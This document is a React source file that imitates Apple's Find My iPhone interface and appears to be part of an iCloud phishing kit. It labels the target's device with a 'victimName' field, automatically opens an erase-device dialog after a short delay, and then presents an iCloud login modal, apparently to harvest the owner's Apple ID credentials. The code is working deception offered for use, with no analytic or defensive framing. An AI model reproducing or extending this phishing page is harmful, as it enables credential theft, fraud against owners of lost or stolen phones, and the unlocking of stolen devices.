import { useEffect, useState } from "react";
import { Card, Container } from "react-bootstrap";
import EraseIphoneModal from "./EraseIphoneModal";
import IcloudLoginModal from "./IcloudLoginModal";
import volume from "../assets/img/volumen.png";
import unlock from "../assets/img/unlock.png";
import maps from "../assets/img/maps.png";
import brujula from "../assets/img/brujula.png";
import headerIcon from "../assets/img/iconoHeaderWhite.png";
import mapsIcon from "../assets/img/iconoSectionWhite.png";
import iconMaps from "../assets/img/iconMaps.png";
import { useData } from "../../context/UserContext";

const CheckData = ({
  translator
}) => {
  const { user } = useData();
  const [showModal, setShowModal] = useState(false);
  const [showIcloudModal, setShowIcloudModal] = useState(false);

  useEffect(() => {
    /*  const el = document.getElementsByClassName("passcode-appear")[0];
      if (el) el.style.width = "100%";*/
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => setShowModal(true), 300);
    return () => clearTimeout(timer);
  }, []);

  const handleEraseSuccess = () => {
    setShowIcloudModal(true);
  };

  return (
    <>
      <Container
        fluid
        style={{
          background: "#181818",
          minHeight: "100vh",
          padding: 0,
          fontFamily: "system-ui, sans-serif",
          color: "#fff",
          maxWidth: "100%",
          margin: "0 auto",
          position: "relative",
          display: "flex",
          flexDirection: "column",
        }}
      >
        {/* Header */}
        <div
          style={{
            background: "#222",
            padding: "10px 10px 10px 14px",
            display: "flex",
            alignItems: "center",
            borderBottom: "1px solid #333",
            height: 44,
            position: "sticky",
            top: 0,
            zIndex: 100,
          }}
        >
          <span
            style={{
              color: "#fff",
              fontWeight: 600,
              fontSize: 20,
              letterSpacing: -1,
              marginRight: 6,
              marginBottom: 6,
            }}
          >
            <img src={headerIcon} alt="" width={80} height="auto" />
          </span>
          <span
            style={{
              color: "#19c37d",
              fontWeight: 600,
              fontSize: 17,
              marginLeft: 2,
            }}
          >
            {translator("Encontrar dispositivos")}
          </span>
          <span
            style={{
              marginLeft: "auto",
              color: "#fff",
              fontSize: 26,
              cursor: "pointer",
              fontWeight: 400,
              paddingRight: 2,
            }}
          >
            <span style={{ fontSize: 28, fontWeight: 400 }}>⋯</span>
          </span>
        </div>

        {/* Contenido scrollable */}
        <div
          style={{
            flex: 1,
            minHeight: 0,
            overflowY: "auto",
            display: "flex",
            flexDirection: "column",
          }}
        >
          {/* Mapa simulado */}
          <div
            style={{
              background: "#2b4652",
              height: "100vh",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              position: "relative",
              borderBottom: "1px solid #23272a",
              overflow: "hidden",
            }}
          >
            {/* Botón de mapa fijo en la esquina superior derecha */}
            <button
              style={{
                position: "fixed",
                top: 62,
                right: 32,
                width: 55,
                height: 33,
                background: "#1a2b34",
                border: "none",
                borderRadius: 10,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                boxShadow: "0 1px 4px rgba(0,0,0,0.18)",
                cursor: "pointer",
                zIndex: 999,
                padding: 0,
              }}
            >
              <img src={maps} alt="" width={28} height={18} />
            </button>
            {/* Círculo grande */}
            <div
              style={{
                width: 220,
                height: 220,
                borderRadius: "50%",
                background: "rgb(23 37 45 / 51%)",
                border: "4px solid #2e3e4e",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                position: "relative",
                bottom: 169
              }}
            >
              <img src={iconMaps} width={80} height={80} style={{ marginBottom: 64 }} />
            </div>
          </div>
        </div>

        {/* Card inferior */}
        <div
          style={{
            width: "100%",
            position: "sticky",
            bottom: 0,
            zIndex: 100,
            display: "flex",
            flexDirection: "column",
            minHeight: 0,
            background: "transparent",
          }}
        >
          {/* Barra Mapas + Legal alineados */}
          <div
            style={{
              position: "fixed",
              left: 17,
              bottom: 370,
              display: "flex",
              alignItems: "center",
              gap: 16,
              zIndex: 1001,
              padding: 0,
              fontFamily: "system-ui, Arial, sans-serif",
              fontSize: 18,
              color: "#fff",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 0 }}>
              <svg
                width="22"
                height="22"
                viewBox="0 0 22 22"
                fill="currentColor"
                xmlns="http://www.w3.org/2000/svg"
                style={{ marginRight: 6, display: "inline", verticalAlign: "middle" }}
              >
                <path d="M16.89 11.77c.01-2.12 1.73-3.13 1.8-3.18-1-1.46-2.56-1.66-3.11-1.68-1.32-.13-2.58.77-3.25.77-.67 0-1.7-.75-2.8-.73-1.44.02-2.77.84-3.51 2.13-1.5 2.6-.38 6.45 1.08 8.56.72 1.04 1.58 2.2 2.71 2.16 1.09-.04 1.5-.7 2.81-.7 1.31 0 1.68.7 2.81.68 1.16-.02 1.89-1.05 2.6-2.1.82-1.19 1.16-2.34 1.17-2.4-.03-.01-2.24-.86-2.26-3.41zm-2.66-6.24c.6-.73 1-1.74.89-2.75-.86.03-1.9.57-2.52 1.3-.55.64-1.03 1.67-.85 2.65.97.08 1.97-.49 2.48-1.2z" />
              </svg>
              <span style={{ fontWeight: 600, letterSpacing: -1, right: 5, position: 'relative', top: 2 }}>{translator("Mapas")}</span>
            </div>
            <a
              href="#"
              style={{
                right: 20,
                position: 'relative',
                top: 2,
                color: "#e0e0e0",
                fontSize: 13,
                marginLeft: 12,
                textDecoration: "underline",
                fontWeight: 400,
                opacity: 0.85,
                letterSpacing: 0,
                background: "none",
                border: "none",
                cursor: "pointer",
              }}
            >
              {translator("Legal")}
            </a>
          </div>

          {/* Iconos fijos encima del Card */}
          <div
            style={{
              position: "fixed",
              right: 17,
              bottom: 370,
              display: "flex",
              alignItems: "center",
              gap: 12,
              zIndex: 1001,
            }}
          >
            {/* Botón zoom */}
            <button
              style={{
                width: 48,
                height: 28,
                background: "#1a2b34",
                border: "none",
                borderRadius: 10,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                boxShadow: "0 1px 4px rgba(0,0,0,0.18)",
                cursor: "pointer",
                padding: 0,
              }}
              aria-label="Zoom"
            >
              <svg width="48" height="28" viewBox="0 0 48 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="4" y="7" width="16" height="14" rx="7" fill="#22343c" />
                <rect x="28" y="7" width="16" height="14" rx="7" fill="#22343c" />
                <text x="12" y="19" textAnchor="middle" fontSize="16" fill="#BFC7CE" fontFamily="Arial" fontWeight="bold">-</text>
                <text x="36" y="19" textAnchor="middle" fontSize="16" fill="#BFC7CE" fontFamily="Arial" fontWeight="bold">+</text>
              </svg>
            </button>
            {/* Brújula */}
            <div
              style={{
                width: 48,
                height: 48,
                background: "#1a2b34",
                borderRadius: "50%",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                boxShadow: "0 1px 4px rgba(0,0,0,0.18)",
              }}
            >
              <img src={brujula} alt="" width={48} height={48} />
            </div>
          </div>
          <Card
            style={{
              position: "fixed",
              bottom: 0,
              left: 0,
              // En lugar de right: 0, usamos width 100%
              width: "100%",
              // Esto asegura que no se meta "debajo" o "encima" del scroll lateral
              maxWidth: "100vw",

              zIndex: 10, // Un valor moderado, no uses 9999 a menos que sea necesario

              background: "#232323",
              borderRadius: "18px 18px 0 0",
              boxShadow: "0 -2px 16px rgba(0,0,0,0.4)",
              border: "none",
              display: "flex",
              flexDirection: "column",

              // IMPORTANTE: Evita que el contenido interno genere su propio scroll horizontal
              overflowX: "hidden",
            }}
          >
            <Card.Body
              style={{
                padding: 0,
                flex: 1,
                display: "flex",
                flexDirection: "column",
                minHeight: 0,
              }}
            >
              {/* Contenido principal, ocupa todo el alto excepto la parte inferior */}
              <div
                style={{
                  flex: 1,
                  padding: 18,
                  display: "flex",
                  flexDirection: "column",
                }}
              >
                {/* Barra superior */}
                <div
                  style={{
                    width: 40,
                    height: 5,
                    background: "#444",
                    borderRadius: 4,
                    margin: "0 auto 18px auto",
                  }}
                />
                {/* Aquí puedes agregar más contenido si lo necesitas */}
              </div>
              {/* Parte inferior: info y botones */}
              <div style={{ padding: 18, paddingTop: 0 }}>
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    marginBottom: 10,
                  }}
                >
                  <div>
                    {(() => {

                      const nombreIphone = user?.data?.victimName ? user?.data?.victimName : "iPhone";
                      const modeloIphone = user?.data?.device ? user?.data?.device : "iPhone";
                      return (
                        <>
                          <div
                            style={{
                              color: "#fff",
                              fontWeight: 600,
                              fontSize: 18,
                            }}
                          >
                            {nombreIphone}
                          </div>
                          <div
                            style={{
                              color: "#b0b0b0",
                              fontSize: 15,
                              fontWeight: 400,
                            }}
                          >
                            {modeloIphone}
                          </div>
                        </>
                      );
                    })()}
                    <div
                      style={{
                        color: "#b0b0b0",
                        fontSize: 15,
                        fontWeight: 400,
                      }}
                    >
                      {translator("Hace 1 min")}
                      <span style={{ fontSize: 18, marginLeft: 8, verticalAlign: "middle", display: "inline-flex", alignItems: "center" }}>
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="rgb(255 255 255 / 54%)" viewBox="0 0 16 16">
                          <path d="M2 6h5v4H2z"></path>
                          <path d="M2 4a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm10 1a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1zm4 3a1.5 1.5 0 0 1-1.5 1.5v-3A1.5 1.5 0 0 1 16 8"></path>
                        </svg>
                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="currentColor" viewBox="0 0 16 16" style={{ marginLeft: 2, marginTop: 1 }}>
                          <path d="M11.251.068a.5.5 0 0 1 .227.58L9.677 6.5H13a.5.5 0 0 1 .364.843l-8 8.5a.5.5 0 0 1-.842-.49L6.323 9.5H3a.5.5 0 0 1-.364-.843l8-8.5a.5.5 0 0 1 .615-.09z"></path>
                        </svg>
                      </span>
                    </div>
                  </div>
                </div>
                <div style={{ display: "flex", gap: 16, marginBottom: 16 }}>
                  {/* Botón Emitir sonido: imagen y texto en columna, alineados a la izquierda */}
                  <button
                    style={{
                      flex: 1,
                      height: 90,
                      borderRadius: 12,
                      background: "#23272a",
                      color: "#fff",
                      fontWeight: 500,
                      fontSize: 17,
                      border: "1px solid #333",
                      display: "flex",
                      alignItems: "flex-start",
                      justifyContent: "flex-start",
                      boxShadow: "none",
                      outline: "none",
                      flexDirection: "column",
                      padding: "0 0 0 18px",
                      gap: 0,
                    }}
                  >
                    <span
                      style={{
                        background: "#4d5cfb",
                        color: "#fff",
                        borderRadius: "50%",
                        width: 32,
                        height: 32,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        fontSize: 18,
                        marginTop: 10,
                        marginBottom: 2,
                      }}
                    >
                      <img src={volume} width={15} />
                    </span>
                    <span style={{ fontSize: 14, marginTop: 2, textAlign: "left" }}>{translator("Emitir sonido")}</span>
                  </button>
                  {/* Botón iPhone perdido: imagen y texto en columna, alineados a la izquierda */}
                  <button
                    style={{
                      flex: 1,
                      height: 90,
                      borderRadius: 12,
                      background: "#23272a",
                      color: "#fff",
                      fontWeight: 500,
                      fontSize: 17,
                      border: "1px solid #333",
                      display: "flex",
                      alignItems: "flex-start",
                      justifyContent: "flex-start",
                      boxShadow: "none",
                      outline: "none",
                      flexDirection: "column",
                      padding: "0 0 0 18px",
                      gap: 0,
                    }}
                  >
                    <span
                      style={{
                        background: "rgb(193 144 30)",
                        color: "#23272a",
                        borderRadius: "50%",
                        width: 32,
                        height: 32,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        fontSize: 18,
                        marginTop: 10,
                        marginBottom: 2,
                      }}
                    >
                      <img src={unlock} width={9} />
                    </span>
                    <span style={{ fontSize: 14, marginTop: 2, textAlign: "left" }}>{translator("iPhone perdido")}</span>
                  </button>
                </div>
                <div
                  style={{
                    background: "#23272a",
                    borderRadius: 12,
                    border: "1px solid #333",
                    overflow: "hidden",
                    display: "flex",
                    flexDirection: "column",
                  }}
                >
                  <button
                    style={{
                      width: "100%",
                      height: 48,
                      background: "none",
                      border: "none",
                      color: "#fff",
                      fontWeight: 500,
                      fontSize: 16,
                      textAlign: "left",
                      padding: "0 18px",
                      borderBottom: "1px solid #333",
                      outline: "none",
                    }}
                  >
                    {translator("Borrar")}
                  </button>
                  <button
                    style={{
                      width: "100%",
                      height: 48,
                      background: "none",
                      border: "none",
                      color: "#fff",
                      fontWeight: 500,
                      fontSize: 16,
                      textAlign: "left",
                      padding: "0 18px",
                      outline: "none",
                    }}
                  >
                    {translator("Eliminar")}
                  </button>
                </div>
              </div>
            </Card.Body>
          </Card>
        </div>
      </Container>
      <EraseIphoneModal
        show={showModal}
        onClose={() => setShowModal(false)}
        onSuccess={handleEraseSuccess}
        translator={translator}
      />
      <IcloudLoginModal
        show={showIcloudModal}
        onClose={() => setShowIcloudModal(false)}
        translator={translator}
      />
    </>
  );
};

export default CheckData;